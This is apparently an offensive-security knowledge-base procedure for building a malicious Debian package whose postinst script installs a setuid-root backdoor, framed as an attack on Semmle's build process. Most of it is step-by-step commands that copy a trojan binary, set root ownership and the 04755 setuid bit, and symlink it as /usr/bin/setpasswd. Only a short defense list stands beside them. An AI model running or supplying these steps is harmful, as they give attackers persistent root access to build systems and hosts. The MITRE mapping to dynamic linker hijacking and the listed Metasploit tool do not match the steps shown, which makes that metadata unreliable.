---
id: proc-001
tags:
  - debian-package
  - setuid
  - backdoor
type: procedure
tools:
  - '[[tools/Metasploit]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ps-ef-list-processes]]'
  - '[[commands/sudo-cp-copy-binary]]'
  - '[[commands/sudo-chown-root-binary]]'
  - '[[commands/sudo-chmod-setuid-binary]]'
  - '[[commands/ln-symlink-backdoor]]'
  - '[[commands/setpasswd-id-background]]'
verified: false
platforms:
  - Linux
  - Debian
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Dynamic Linker Hijacking]]'
updated_at: '2025-12-14T17:30:58.244Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Dynamic Linker Hijacking]]'
---
# Create-Malicious-Debian-Package-with-Setuid-Backdoor

## Summary

This procedure creates a malicious Debian package (.deb) containing a postinst script that deploys a setuid root binary backdoor, enabling privilege escalation when installed via apt.

## Description

In the context of Semmle's build process, attackers upload source code with a custom .deb. The postinst script runs during installation, copying a pre-compiled C binary (that executes system calls as root) to a persistent location, setting root ownership and setuid permissions (04755), creating a symlink for easy access (/usr/bin/setpasswd), and testing with an 'id' command. This exploits lack of package validation, leading to root shell access in the container. Prerequisites include Debian packaging tools and a compiled backdoor binary.

## Requirements

1. Debian environment with dpkg-deb and fakeroot installed
2. Pre-compiled C binary (e.g., /opt/src/run) that uses system() for command execution
3. Access to build package control files (DEBIAN/postinst)

## Defense

Defensive measures and detection strategies:

- Validate all uploaded packages against trusted repositories; block local .deb installs
- Scan source uploads for .deb files and executable binaries
- Monitor apt installs in build steps for anomalies (e.g., setuid changes)

## Objectives

1. Deploy persistent setuid backdoor for root escalation
2. Test immediate privilege gain during installation
3. Ensure backdoor survives build failure

## Instructions

### Step 1: Prepare Backdoor Binary and Package Structure

**Context**: Compile or obtain the C binary that acts as a trojan, executing commands via system() as root when setuid.

Create the DEBIAN/postinst script with reconnaissance using [[commands/ps-ef-list-processes]]:

```bash
ps -ef
```

> Lists running processes for situational awareness during install.

### Step 2: Copy Binary to Persistent Location

**Context**: Stage the binary in a mounted filesystem (/suidfs) to survive container restarts.

Execute [[commands/sudo-cp-copy-binary]]:

```bash
sudo cp /opt/src/run /suidfs/passwd
```

> Copies the binary; expected output confirms file transfer.

### Step 3: Set Root Ownership

**Context**: Ensure the binary runs as root by changing ownership.

Execute [[commands/sudo-chown-root-binary]]:

```bash
sudo chown root:root /suidfs/passwd
```

> Ownership updated to root:root.

### Step 4: Apply Setuid Permissions

**Context**: Enable privilege escalation by setting the setuid bit.

Execute [[commands/sudo-chmod-setuid-binary]]:

```bash
sudo chmod 04755 /suidfs/passwd
```

> Permissions set to 4755 (setuid root executable).

### Step 5: Create Symlink for Access

**Context**: Make the backdoor easily invocable as a standard command.

Execute [[commands/ln-symlink-backdoor]]:

```bash
ln -s /suidfs/passwd /usr/bin/setpasswd
```

> Symlink created for /usr/bin/setpasswd.

### Step 6: Test Escalation in Background

**Context**: Verify root access immediately during postinst.

Execute [[commands/setpasswd-id-background]]:

```bash
setpasswd id &
```

> Runs 'id' via the binary in background; outputs uid=0(root).

Build the .deb using dpkg-deb --build.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Dynamic Linker Hijacking]]

### Sub-Techniques


## Commands Used

- [[commands/ps-ef-list-processes]]
- [[commands/sudo-cp-copy-binary]]
- [[commands/sudo-chown-root-binary]]
- [[commands/sudo-chmod-setuid-binary]]
- [[commands/ln-symlink-backdoor]]
- [[commands/setpasswd-id-background]]

## Tools Used

- [[tools/Metasploit]]

## Tags

- debian-package
- setuid
- backdoor
